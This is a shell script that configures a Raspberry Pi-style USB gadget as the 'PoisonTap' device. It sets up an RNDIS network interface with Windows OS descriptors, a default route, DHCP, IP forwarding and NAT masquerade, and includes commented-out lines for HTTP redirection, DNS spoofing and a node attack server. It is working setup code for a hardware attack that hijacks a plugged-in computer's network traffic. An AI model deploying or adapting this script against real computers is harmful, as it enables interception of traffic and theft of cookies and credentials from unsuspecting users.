rmmod g_ether
cd /sys/kernel/config/usb_gadget/
mkdir -p poisontap
cd poisontap

echo 0x0694 > idVendor
echo 0x0005 > idProduct

mkdir -p strings/0x409
echo "Samy Kamkar" > strings/0x409/manufacturer
echo "PoisonTap" > strings/0x409/product

# RNDIS
mkdir configs/c.2
echo "0xC0" > configs/c.2/bmAttributes
echo "1" > configs/c.2/MaxPower
mkdir configs/c.2/strings/0x409
echo "RNDIS" > configs/c.2/strings/0x409/configuration
echo "1" > os_desc/use
echo "0xcd" > os_desc/b_vendor_code
echo "MSFT100" > os_desc/qw_sign

mkdir functions/rndis.usb0
echo "42:61:64:55:53:45" > functions/rndis.usb0/dev_addr
echo "48:6f:73:74:50:44" > functions/rndis.usb0/host_addr
echo "RNDIS" > functions/rndis.usb0/os_desc/interface.rndis/
compatible_id
echo "5162001" > functions/rndis.usb0/os_desc/interface.rndis/sub_
compatible_id

ln -s functions/rndis.usb0 configs/c.2
ln -s configs/c.2 os_desc

ls /sys/class/udc > UDC
modprobe g_ether

sleep 10
ifup usb0
ifconfig usb0 up
/sbin/route add -net 0.0.0.0/0 usb0
/etc/init.d/isc-dhcp-server restart

/sbin/sysctl -w net.ipv4.ip_forward=1
#iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-ports 1337
#/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
#/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js
iptables -t nat -A POSTROUTING -o usb0 -j MASQUERADE
